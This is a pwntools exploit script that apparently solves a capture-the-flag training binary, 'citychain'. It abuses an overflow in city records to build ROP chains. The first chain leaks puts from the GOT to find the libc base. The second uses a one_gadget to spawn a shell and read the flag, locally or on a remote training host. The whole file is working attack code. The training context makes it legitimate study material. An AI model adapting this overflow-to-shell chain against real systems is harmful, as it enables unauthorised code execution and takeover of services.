from pwn import *

if(len(sys.argv) > 1):
    if(sys.argv[1] == '--debug'):
        p = process("./citychain")
        gdb.attach(p, """
            b *0x00401568
        """ )
        input("wait...")
    elif(sys.argv[1] == '--strace'):
        p = process(["strace", "./citychain"])
    elif(sys.argv[1] == '--remote'):
        p = remote("bin.training.offdef.it", 5003)
else:
    p = process("./citychain")

def add_city(name, lat, long, pop, area, elevation):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b': ')
    p.sendline(name)
    p.recvuntil(b': ')
    p.sendline(b"%f" % lat)
    p.recvuntil(b': ')
    p.sendline(b"%f" % long)
    p.recvuntil(b': ')
    p.sendline(b"%d" % pop)
    p.recvuntil(b': ')
    p.sendline(b"%d" % area)
    p.recvuntil(b': ')
    p.sendline(b"%d" % elevation)
    p.recvuntil(b'2) Quit\n')

def chain(name, a, b, c, d, e):
    add_city(name, d, e, c, a, b)

libc = ELF("./libc-2.31.so")
binary = ELF("./citychain")

# Leak LIBC (print a got address, need: POP RDI -> 1, POP RSI -> got address, RDX ok, RAX -> 1, syscall)

start = 0x00401130
pop_rdi = 0x00000000004015d3
read_got = binary.symbols.got.puts
puts = binary.symbols.plt.puts

add_city(b'First', 10, 10, 10, 10, 10) # Overflow

#add_city('Second', 10.5, 10.5, 0xdddddddddddddddd, 0xeeeeeeeeeeeeeeee, 0xffffffffffffffff)
chain(b'Second', pop_rdi, read_got, puts, 0x11, 0x10)
chain(b'Third', pop_rdi, read_got, puts, 0.4198704, 0) # 0.4198704 to restart  ## hex(int(0.4198704 * 10000000.0)) = start

p.recvuntil(b'> ')
p.sendline(b'2')

leak = u64(p.recvuntil(b'\n')[:-1] + b'\x00\x00')
print("[!] leak libc (puts): %#x" % leak)

libc.address = leak - libc.symbols.puts

print("[!] libc: %#x" % libc.address)

# Second Step (try to use a one_gadget)
pop_r12 = 0x0000000000401498
one_gadget = 0xe3afe # 0xe3afe 0xe3b01 0xe3b04
#one_gadget = 0x693cd # 0x3f303 0x693c3 0x693c9 0x693cd
system = libc.symbols["system"]
binsh = next(libc.search(b"/bin/sh\x00"))

add_city(b'First', 10, 10, 10, 10, 10) # Overflow
#chain(b'Second', libc.address+one_gadget, 0, 0, 0, 0)
chain(b'Second', pop_r12, 0, libc.address+one_gadget, 0, 0)
#chain(b'Second', p64(system), p64(binsh), 0, 0, 0)


p.recvuntil(b'> ')
p.sendline(b'2')

p.sendline(b'cat flag')

p.interactive()